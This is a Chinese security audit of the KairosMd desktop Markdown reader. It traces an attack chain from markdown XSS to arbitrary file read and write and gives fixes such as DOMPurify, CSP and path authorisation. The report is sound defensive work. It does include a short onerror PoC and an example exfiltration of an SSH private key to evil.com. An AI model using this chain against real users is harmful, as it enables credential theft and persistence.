# KairosMd 安全排查报告

- **排查日期**：2026-08-16
- **对象版本**：v0.2.0（Wails v3.0.0-beta.8 + Vue 3）
- **排查范围**：Go 后端（`main.go` / `files.go` / `assets.go`）、前端渲染管线与插件运行时、HTML 导出、依赖清单、构建配置、仓库卫生
- **方法**：人工代码审计 + `npm audit`（官方源）+ 仓库产物检查（`govulncheck` 本机未安装，Go 依赖面极小，见附录）

---

## TL;DR

KairosMd 的本地防御意识不错（`/kfs` 白名单、插件 ID 防穿越、原子写入、外部插件默认禁用），但存在**一条完整的严重攻击链**：

> 打开一个恶意 `.md` 文件 → Markdown 渲染允许原始 HTML 且无任何净化（`html: true` + `v-html`）→ 任意 JS 在应用同源上下文执行 → 调用 Wails 绑定的 `ReadFile` / `WriteFile`（**接受任意路径，无约束**）→ 敏感文件窃取 + 任意文件写入（可写启动项实现持久化）。

「阅读器」的核心场景就是打开不可信来源的文档，此链路触发门槛仅为**打开文件**，评为高危。依赖层面（npm audit 0 漏洞）与仓库卫生（无密钥、无产物泄露）目前干净。

| # | 等级 | 问题 | 位置 |
|---|------|------|------|
| S1 | 🔴 高 | Markdown 渲染 XSS：`html: true` + `v-html`，无 sanitize | `pipeline.ts:108`、`ReaderView.vue:237` |
| S2 | 🟠 中 | Go 绑定 `ReadFile`/`WriteFile`/`SaveClipboardImage` 接受任意路径 | `files.go:262,292,297` |
| S3 | 🟠 中 | 插件系统 `new Function` 执行任意 JS，无权限模型 | `runtime.ts:246` |
| S4 | 🟠 中 | 导出 HTML 内嵌未净化内容，成为 XSS 传播载体 | `exportHtml.ts:17` |
| S5 | 🟠 中 | 全程无 CSP（index.html 与 AssetHandler 均未设置） | `main.go:38`、`index.html` |
| S6 | 🟡 低 | `/kfs` 允许 SVG，可被 `<iframe>` 同源加载执行脚本 | `assets.go:19` |
| S7 | 🟡 低 | 远程图片/协议相对 URL 直通，打开文档即外发请求 | `pipeline.ts:85` |
| S8 | 🟡 低 | 草稿与配置明文存储，多用户机器可读 | `files.go:387` |
| S9 | ⚪ 提示 | Wails v3 beta 依赖用于生产分发 | `go.mod` |
| S10 | ⚪ 提示 | 动态 `import()` 拼接语言名（已被 Vite 构建约束，实际不可利用） | `shiki.ts:102` |

---

## S1 🔴 Markdown 渲染 XSS（核心漏洞）

**位置**
- `frontend/src/core/markdown/pipeline.ts:108` — `new MarkdownIt({ html: true, ... })`
- `frontend/src/components/ReaderView.vue:237` — `<article v-html="doc.html" />`
- 全项目仅此一处 `v-html`，渲染管线是唯一 HTML 来源

**问题**：渲染管线开启 `html: true` 允许 Markdown 内嵌原始 HTML 直通输出，且渲染结果未经 DOMPurify 等任何净化就通过 `v-html`（等价 `innerHTML`）插入 DOM。`<script>` 标签虽不因 innerHTML 执行，但 `<img onerror>`、`<svg onload>`、`<iframe srcdoc>`、`<details ontoggle>` 等大量向量可执行任意 JS。

**PoC（概念验证）**：一个内容如下的 `evil.md`，双击打开即触发：

```markdown
# 看起来正常的笔记
<img src=x onerror="/* 任意 JS，与应用同源 */">
```

**影响（与 S2 组合成完整链）**：Wails 绑定全部暴露给页面 JS，XSS 后可直接：
- `ReadFile('C:/Users/<me>/.ssh/id_rsa')` 等任意读取，再借 `resolveAsset` 已放行的 `https://` 通道（`<img src="https://evil.com/?d=…">`）外带数据；
- `WriteFile` / `SaveClipboardImage` 任意路径写入任意内容（写入启动目录 `.bat`、覆盖配置文件等实现持久化，接近本机 RCE）；
- 调用 `OpenNewWindow`、`QuitApp`、`RevealPath` 等其余绑定。

**修复建议**
1. 引入 [DOMPurify](https://github.com/cure53/DOMPurify)，在渲染结果进入 `v-html` 前统一净化（放在 `pipeline.render()` 末尾、`afterRender` 钩子之后，保证插件产物同样受检）：
   ```ts
   import DOMPurify from 'dompurify'
   html = DOMPurify.sanitize(html, {
     FORBID_TAGS: ['style', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'textarea', 'script', 'link', 'meta', 'base'],
     // data-k-ext / data-k-md / data-line 等自定义属性默认保留（ALLOW_DATA_ATTR: true）
   })
   ```
   事件属性（`onerror` 等）DOMPurify 默认移除。
2. 若担心破坏合法的 HTML 内嵌需求，至少提供「严格模式（默认）/ 信任本文档」开关，而不是全局裸奔。
3. 同步修复 S5（CSP），使净化器一旦被绕过仍有第二道防线。

---

## S2 🟠 Go 绑定接受任意路径

**位置**：`files.go:262`（`ReadFile`）、`files.go:292`（`WriteFile`）、`files.go:297`（`SaveClipboardImage`）、`files.go:530`（`RevealPath`）

**问题**：这些绑定对前端传入的路径没有任何约束。正常 UI 流程里路径来自文件对话框，但一旦前端被 XSS（S1）或恶意插件（S3）控制，绑定即成为「任意文件读写原语」。`SaveClipboardImage` 的 `name` 参数也未清洗——`filepath.Join(dir, name)` 经 Clean 后 `name` 携带 `..\..\` 即可逃出 `dir`。

值得肯定的是 `/kfs` 媒体服务已经做了目录白名单（`assets.go:46`），说明威胁模型是成立的——但绑定层完全没有对应防线，等于前门上锁、侧门敞开。

**修复建议**
1. 后端维护「会话授权路径集」：仅文件对话框返回的路径、命令行/双击打开的路径、及其所在目录（与 `AllowDir` 复用同一机制）；`ReadFile`/`WriteFile` 校验路径落在授权集内，否则拒绝。
2. `SaveClipboardImage` 中强制 `name = filepath.Base(name)` 并校验扩展名白名单（与 `assetExts` 对齐），`dir` 同样纳入授权集校验。
3. `WriteFile` 可进一步要求目标扩展名为 `.md/.markdown/.mdx`（保存文档场景足够）。

---

## S3 🟠 插件系统执行任意 JS，无权限模型

**位置**：`frontend/src/core/plugins/runtime.ts:246` — `new Function('kairos', `"use strict"\n${code}`)`

**问题**：`%APPDATA%/KairosMd/plugins/<id>/main.js` 以应用全权限执行：可访问所有 Wails 绑定（含 S2 的任意路径读写）、DOM、配置。manifest 无权限声明，无来源/签名校验，无安装确认展示内容。作为「可从网上下载分享的插件包」，这是典型供应链风险：一个被投毒的插件 = 完全控制用户机器。

**现状缓解**：外部插件默认禁用（`enabledMap[id] === true` 才启用）✓；`ReadPluginCode` 用 `filepath.Base(id)` 防路径穿越 ✓。

**修复建议**
1. manifest 增加 `permissions` 声明（如 `files` / `network` / `commands`），`KairosApi` 按声明裁剪能力，越权调用抛错；
2. 启用外部插件时弹确认框，展示插件将获得的权限；
3. 插件管理页对「无 author / 无版本 / 手动放入」的插件给显著警示文案；
4. 长期可考虑签名/校验和分发渠道。

---

## S4 🟠 导出 HTML 内嵌未净化内容

**位置**：`frontend/src/core/markdown/exportHtml.ts:17` — `const body = await inlineImages(html)`

**问题**：`buildExportHtml` 将 `doc.html`（S1 的未净化产物）原样写入导出文件。导出 HTML 的典型用途是**分享给别人**，恶意 `.md` 借此变成传播载体：接收者在浏览器打开导出文件即触发 XSS（浏览器上下文无 Wails 绑定，但可用于钓鱼、挖矿脚本、读取该域下资源等）。

**修复建议**：与 S1 共用同一净化函数，导出前对 body 再次 sanitize；导出文件本身也可内嵌一条保守 CSP `<meta>`（`script-src 'none'`）。

---

## S5 🟠 未设置内容安全策略（CSP）

**位置**：`frontend/index.html`（无 `<meta http-equiv="Content-Security-Policy">`）；`main.go:38` `assetHandler`（未注入响应头）

**问题**：Wails v2 脚手架默认生成的 CSP 在迁移 v3 时丢失。当前没有任何策略阻止内联事件处理器、外部脚本加载等——S1 一旦被利用，无纵深防御。

**修复建议**：在 `assetHandler` 外再包一层中间件为所有响应注入 CSP 头（比 HTML meta 覆盖更全，能管到 `/kfs` 等动态路径）：

```go
func withCSP(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy",
			"default-src 'self'; img-src 'self' data: blob: https:; media-src 'self' https:; "+
				"style-src 'self' 'unsafe-inline'; font-src 'self' data:; connect-src 'self'; "+
				"script-src 'self'; frame-src 'none'; object-src 'none'")
		next.ServeHTTP(w, r)
	})
}
```

要点：`script-src 'self'` 不含 `'unsafe-inline'`（内联事件处理器将被拦截）；KaTeX/字体按需放宽。若前端无 `<script>` 内联，此策略对现有功能应当无损，上线前回归验证主题与公式渲染即可。

---

## S6 🟡 `/kfs` 允许 SVG（iframe 同源执行）

**位置**：`assets.go:19`（`.svg` 在 `assetExts` 白名单）

**问题**：SVG 经 `<img>` 引用时脚本不执行（安全），但在 S1 的 raw HTML 下可用 `<iframe src="/kfs?path=…payload.svg">` 把同目录的 SVG 作为**同源文档**加载，其中的 `<script>` 会执行并可调用 Wails 绑定——这是独立于 `onerror` 的第二条 XSS 路径（需要 md 与 payload.svg 同目录，常见于「示例项目 zip」分发场景）。

**修复建议**：给 `/kfs` 响应加两个头，使 SVG 只能作为图像使用、作为文档加载时被沙箱化（不影响正常 `<img>` 预览）：

```go
w.Header().Set("Content-Security-Policy", "default-src 'none'; sandbox")
w.Header().Set("X-Content-Type-Options", "nosniff")
```

---

## S7 🟡 远程媒体直通（打开即外发请求）

**位置**：`pipeline.ts:85` — `resolveAsset` 放行 `https:`、`//`、`data:`、`blob:` 来源

**问题**：文档中引用远程图片时，**打开文档即自动向外部发起请求**，可被用于：探测「目标打开了此文件」（信标）、记录阅读行为与 IP、按 Referer/时序侧信道。对一款常用来打开来路不明文档的阅读器，这是隐私面问题。

**修复建议**：设置项「加载远程图片：总是 / 点击占位后加载（默认）」，未加载时显示占位块，点击再替换 `src`。这与 S5 的 CSP 需协调（`img-src https:` 收紧与否）。

---

## S8 🟡 草稿与配置明文存储

**位置**：`files.go:387`（`SaveDraft`），`%APPDATA%/KairosMd/drafts/*.json` 保留 30 天；`config.json` 含最近文件列表

**问题**：未保存的文档全文以明文 JSON 长期留在磁盘，同机其他用户/进程（以相同用户权限运行的任何程序）可读。对桌面应用属常见做法，列出供知情决策。

**建议**：接受现状即可；若要收紧，可在「清除最近记录」命令中一并清理 drafts 目录，或缩短保留期。

---

## S9 ⚪ Wails v3 beta 用于分发

`go.mod` 固定 `v3.0.0-beta.8`、前端 `@wailsio/runtime ^3.0.0-beta.8`。beta 阶段 API 与安全修复均不稳定（历史 beta 版本间曾有行为变化），正式发布产品前建议跟进 stable 版本并关注其安全公告。

## S10 ⚪ 动态 `import()` 拼接（实际不可利用）

`shiki.ts:102` 以 `` import(`shiki/langs/${name}.mjs`) `` 按语言名动态导入。语言名来自文档 fence 标记，但 Vite 构建会把动态 import 约束为编译期 glob 匹配，非法值只会 reject 并被 `.catch(() => {})` 吞掉，无法加载任意模块。无需处理，记录在案避免误报。

---

## 做得好的地方

- `/kfs` 媒体服务有**目录白名单 + 扩展名白名单 + 大小写规范化**，前缀比较无 `dir` vs `dir-other` 误匹配，`filepath.Clean` 兜底穿越（`assets.go:32`、`files.go:123`）；
- `ReadPluginCode` 用 `filepath.Base(id)` 防穿越；插件命令 ID 强制带命名空间前缀；
- 所有写盘走**临时文件 + rename 原子写**，多进程配置合并避免旧状态覆盖；
- `ReadFile` 有 16MB 上限（DoS 缓解）；GB18030 回退解码不引入风险；
- 外部链接强制 `target=_blank` + `rel=noopener`，且外链统一经 `BrowserOpenURL` 走系统浏览器；
- 外部插件默认禁用；markdown-it 默认 `validateLink` 拦截 `javascript:` 伪协议；
- 依赖精简：npm audit **0 漏洞**（含 devDependencies）；仓库无密钥泄露，`.gitignore` 正确排除 `*.exe` / `.zcode` / 构建产物；exe manifest 为 `asInvoker` 无提权。

---

## 修复优先级

1. **立即**：S1 净化（DOMPurify） + S5 CSP —— 两条防线一次建立，阻断核心攻击链；
2. **随后**：S2 绑定路径授权集（含 `SaveClipboardImage` 的 `filepath.Base`）、S4 导出净化、S6 `/kfs` 响应头；
3. **规划**：S3 插件权限模型、S7 远程媒体加载策略、S9 升级 Wails stable。

## 附录：工具检查记录

| 检查 | 命令 | 结果 |
|------|------|------|
| 前端依赖 | `npm audit`（registry.npmjs.org，含 dev） | 0 vulnerabilities |
| Go 漏洞 | `govulncheck` | 本机未安装未运行；依赖仅 wails beta + x/text v0.39（无已知 CVE），建议 CI 中补 `golang.org/x/vuln/cmd/govulncheck` |
| 仓库泄露 | `git ls-files` 检查 exe/dll/plans 等 | 无二进制与本地数据被追踪 |
| 敏感信息 | 人工检查 `build/config.yml`、`Info.plist`、manifest | 无密钥/内网地址 |
